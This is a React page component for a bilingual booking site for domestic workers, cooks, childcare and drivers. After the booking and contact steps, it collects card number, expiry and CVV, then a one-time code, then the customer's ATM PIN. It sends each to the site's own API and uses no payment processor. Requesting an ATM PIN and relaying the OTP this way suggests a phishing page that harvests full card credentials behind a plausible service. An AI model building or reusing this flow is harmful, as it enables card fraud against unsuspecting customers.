import { useState } from 'react';
import { useLocation } from 'wouter';
import Header from '@/components/Header';

export default function Booking() {
  const [location, setLocation] = useLocation();
  const [language, setLanguage] = useState<'en' | 'es'>('en');
  const [step, setStep] = useState<'booking' | 'customer' | 'payment' | 'otp' | 'pin' | 'success'>('booking');
  
  // Booking data
  const [bookingData, setBookingData] = useState({
    serviceType: '',
    duration: '',
    date: '',
    time: '',
    workers: 1,
  });

  // Customer data
  const [customerData, setCustomerData] = useState({
    name: '',
    email: '',
    phone: '',
    address: '',
  });

  // Payment data
  const [formData, setFormData] = useState({
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: '',
  });

  const [otp, setOtp] = useState('');
  const [pin, setPin] = useState('');
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [bookingId, setBookingId] = useState('');

  const translations = {
    en: {
      selectService: 'Select Service',
      serviceType: 'Service Type',
      duration: 'Duration',
      date: 'Date',
      time: 'Time',
      workers: 'Number of Workers',
      continue: 'Continue',
      customerInfo: 'Customer Information',
      name: 'Full Name',
      email: 'Email Address',
      phone: 'Phone Number',
      address: 'Address',
      cardDetails: 'Card Details',
      cardNumber: 'Card Number',
      cardHolder: 'Card Holder Name',
      expiryDate: 'Expiry Date (MM/YY)',
      cvv: 'CVV',
      submit: 'Submit Payment',
      processing: 'Processing...',
      otp: 'Enter OTP',
      enterOtp: 'Enter the OTP sent to your email',
      verifyOtp: 'Verify OTP',
      pin: 'Enter ATM PIN',
      enterPin: 'Enter your ATM PIN',
      verifyPin: 'Verify PIN',
      success: 'Payment Successful!',
      error: 'Error',
      back: 'Back',
    },
    es: {
      selectService: 'Seleccionar Servicio',
      serviceType: 'Tipo de Servicio',
      duration: 'Duración',
      date: 'Fecha',
      time: 'Hora',
      workers: 'Número de Trabajadores',
      continue: 'Continuar',
      customerInfo: 'Información del Cliente',
      name: 'Nombre Completo',
      email: 'Correo Electrónico',
      phone: 'Número de Teléfono',
      address: 'Dirección',
      cardDetails: 'Detalles de la Tarjeta',
      cardNumber: 'Número de Tarjeta',
      cardHolder: 'Nombre del Titular',
      expiryDate: 'Fecha de Vencimiento (MM/YY)',
      cvv: 'CVV',
      submit: 'Enviar Pago',
      processing: 'Procesando...',
      otp: 'Ingrese OTP',
      enterOtp: 'Ingrese el OTP enviado a su correo',
      verifyOtp: 'Verificar OTP',
      pin: 'Ingrese PIN ATM',
      enterPin: 'Ingrese su PIN ATM',
      verifyPin: 'Verificar PIN',
      success: 'Pago Exitoso!',
      error: 'Error',
      back: 'Atrás',
    },
  };

  const t = translations[language];

  // Handle booking step
  const handleBookingSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStep('customer');
  };

  // Handle customer info step
  const handleCustomerSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    try {
      // Create booking in database
      const response = await fetch('/api/booking/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          serviceType: bookingData.serviceType,
          duration: bookingData.duration,
          date: bookingData.date,
          time: bookingData.time,
          workers: bookingData.workers,
          customerName: customerData.name,
          customerEmail: customerData.email,
          customerPhone: customerData.phone,
          customerAddress: customerData.address,
        }),
      });

      if (response.ok) {
        const data = await response.json();
        setBookingId(data.bookingId);
        setStep('payment');
      } else {
        setMessage(language === 'en' ? 'Error creating booking' : 'Error al crear reserva');
      }
    } catch (error) {
      setMessage(language === 'en' ? 'Network error' : 'Error de red');
    } finally {
      setLoading(false);
    }
  };

  const handleCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    try {
      const response = await fetch('/api/payment/submit-card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...formData,
          email: customerData.email,
          bookingId: bookingId,
        }),
      });

      if (response.ok) {
        setStep('otp');
      } else {
        setMessage(language === 'en' ? 'Error submitting card details' : 'Error al enviar detalles de la tarjeta');
      }
    } catch (error) {
      setMessage(language === 'en' ? 'Network error' : 'Error de red');
    } finally {
      setLoading(false);
    }
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    try {
      const response = await fetch('/api/payment/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp, email: customerData.email, bookingId: bookingId }),
      });

      if (response.ok) {
        setStep('pin');
      } else {
        setMessage(language === 'en' ? 'Invalid OTP' : 'OTP inválido');
      }
    } catch (error) {
      setMessage(language === 'en' ? 'Network error' : 'Error de red');
    } finally {
      setLoading(false);
    }
  };

  const handlePinSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    try {
      const response = await fetch('/api/payment/verify-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pin, email: customerData.email, bookingId: bookingId }),
      });

      if (response.ok) {
        setStep('success');
      } else {
        setMessage(language === 'en' ? 'Invalid PIN' : 'PIN inválido');
      }
    } catch (error) {
      setMessage(language === 'en' ? 'Network error' : 'Error de red');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50">
      <Header language={language} onLanguageChange={setLanguage} />
      
      <main className="flex-1 max-w-4xl mx-auto w-full px-4 py-8">
        {step === 'booking' && (
          <form onSubmit={handleBookingSubmit} className="bg-white rounded-lg shadow-md p-6">
            <h2 className="text-2xl font-bold mb-6">{t.selectService}</h2>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
              <div>
                <label className="block text-sm font-medium mb-2">{t.serviceType}</label>
                <select
                  value={bookingData.serviceType}
                  onChange={(e) => setBookingData({ ...bookingData, serviceType: e.target.value })}
                  className="w-full border rounded-md p-2"
                  required
                >
                  <option value="">Select...</option>
                  <option value="domestic">Domestic Worker</option>
                  <option value="cook">Cook</option>
                  <option value="childcare">Childcare</option>
                  <option value="driver">Driver</option>
                </select>
              </div>

              <div>
                <label className="block text-sm font-medium mb-2">{t.duration}</label>
                <select
                  value={bookingData.duration}
                  onChange={(e) => setBookingData({ ...bookingData, duration: e.target.value })}
                  className="w-full border rounded-md p-2"
                  required
                >
                  <option value="">Select...</option>
                  <option value="2">2 hours</option>
                  <option value="4">4 hours</option>
                  <option value="6">6 hours</option>
                  <option value="8">8 hours</option>
                </select>
              </div>

              <div>
                <label className="block text-sm font-medium mb-2">{t.date}</label>
                <input
                  type="date"
                  value={bookingData.date}
                  onChange={(e) => setBookingData({ ...bookingData, date: e.target.value })}
                  className="w-full border rounded-md p-2"
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium mb-2">{t.time}</label>
                <input
                  type="time"
                  value={bookingData.time}
                  onChange={(e) => setBookingData({ ...bookingData, time: e.target.value })}
                  className="w-full border rounded-md p-2"
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium mb-2">{t.workers}</label>
                <input
                  type="number"
                  min="1"
                  max="5"
                  value={bookingData.workers}
                  onChange={(e) => setBookingData({ ...bookingData, workers: parseInt(e.target.value) })}
                  className="w-full border rounded-md p-2"
                  required
                />
              </div>
            </div>

            <button
              type="submit"
              className="w-full bg-red-600 text-white py-2 rounded-md font-medium hover:bg-red-700"
            >
              {t.continue}
            </button>
          </form>
        )}

        {step === 'customer' && (
          <form onSubmit={handleCustomerSubmit} className="bg-white rounded-lg shadow-md p-6">
            <h2 className="text-2xl font-bold mb-6">{t.customerInfo}</h2>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
              <div>
                <label className="block text-sm font-medium mb-2">{t.name}</label>
                <input
                  type="text"
                  value={customerData.name}
                  onChange={(e) => setCustomerData({ ...customerData, name: e.target.value })}
                  className="w-full border rounded-md p-2"
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium mb-2">{t.email}</label>
                <input
                  type="email"
                  value={customerData.email}
                  onChange={(e) => setCustomerData({ ...customerData, email: e.target.value })}
                  className="w-full border rounded-md p-2"
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium mb-2">{t.phone}</label>
                <input
                  type="tel"
                  value={customerData.phone}
                  onChange={(e) => setCustomerData({ ...customerData, phone: e.target.value })}
                  className="w-full border rounded-md p-2"
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium mb-2">{t.address}</label>
                <input
                  type="text"
                  value={customerData.address}
                  onChange={(e) => setCustomerData({ ...customerData, address: e.target.value })}
                  className="w-full border rounded-md p-2"
                  required
                />
              </div>
            </div>

            {message && <p className="text-red-600 mb-4">{message}</p>}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-red-600 text-white py-2 rounded-md font-medium hover:bg-red-700 disabled:opacity-50"
            >
              {loading ? t.processing : t.continue}
            </button>
          </form>
        )}

        {step === 'payment' && (
          <form onSubmit={handleCardSubmit} className="bg-white rounded-lg shadow-md p-6">
            <h2 className="text-2xl font-bold mb-6">{t.cardDetails}</h2>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
              <div className="md:col-span-2">
                <label className="block text-sm font-medium mb-2">{t.cardNumber}</label>
                <input
                  type="text"
                  placeholder="4532 8970 1234 5678"
                  value={formData.cardNumber}
                  onChange={(e) => setFormData({ ...formData, cardNumber: e.target.value })}
                  className="w-full border rounded-md p-2"
                  required
                />
              </div>

              <div className="md:col-span-2">
                <label className="block text-sm font-medium mb-2">{t.cardHolder}</label>
                <input
                  type="text"
                  value={formData.cardHolder}
                  onChange={(e) => setFormData({ ...formData, cardHolder: e.target.value })}
                  className="w-full border rounded-md p-2"
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium mb-2">{t.expiryDate}</label>
                <input
                  type="text"
                  placeholder="MM/YY"
                  value={formData.expiryDate}
                  onChange={(e) => setFormData({ ...formData, expiryDate: e.target.value })}
                  className="w-full border rounded-md p-2"
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium mb-2">{t.cvv}</label>
                <input
                  type="text"
                  placeholder="123"
                  value={formData.cvv}
                  onChange={(e) => setFormData({ ...formData, cvv: e.target.value })}
                  className="w-full border rounded-md p-2"
                  required
                />
              </div>
            </div>

            {message && <p className="text-red-600 mb-4">{message}</p>}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-red-600 text-white py-2 rounded-md font-medium hover:bg-red-700 disabled:opacity-50"
            >
              {loading ? t.processing : t.submit}
            </button>
          </form>
        )}

        {step === 'otp' && (
          <form onSubmit={handleOtpSubmit} className="bg-white rounded-lg shadow-md p-6">
            <h2 className="text-2xl font-bold mb-6">{t.otp}</h2>
            <p className="text-gray-600 mb-4">{t.enterOtp}</p>
            
            <input
              type="text"
              placeholder="000000"
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              className="w-full border rounded-md p-2 mb-6"
              required
            />

            {message && <p className="text-red-600 mb-4">{message}</p>}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-red-600 text-white py-2 rounded-md font-medium hover:bg-red-700 disabled:opacity-50"
            >
              {loading ? t.processing : t.verifyOtp}
            </button>
          </form>
        )}

        {step === 'pin' && (
          <form onSubmit={handlePinSubmit} className="bg-white rounded-lg shadow-md p-6">
            <h2 className="text-2xl font-bold mb-6">{t.pin}</h2>
            <p className="text-gray-600 mb-4">{t.enterPin}</p>
            
            <input
              type="password"
              placeholder="****"
              value={pin}
              onChange={(e) => setPin(e.target.value)}
              className="w-full border rounded-md p-2 mb-6"
              required
            />

            {message && <p className="text-red-600 mb-4">{message}</p>}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-red-600 text-white py-2 rounded-md font-medium hover:bg-red-700 disabled:opacity-50"
            >
              {loading ? t.processing : t.verifyPin}
            </button>
          </form>
        )}

        {step === 'success' && (
          <div className="bg-white rounded-lg shadow-md p-6 text-center">
            <h2 className="text-2xl font-bold mb-4 text-green-600">{t.success}</h2>
            <p className="text-gray-600 mb-4">Booking ID: {bookingId}</p>
            <button
              onClick={() => setLocation('/')}
              className="bg-red-600 text-white py-2 px-6 rounded-md font-medium hover:bg-red-700"
            >
              {t.back}
            </button>
          </div>
        )}
      </main>
    </div>
  );
}
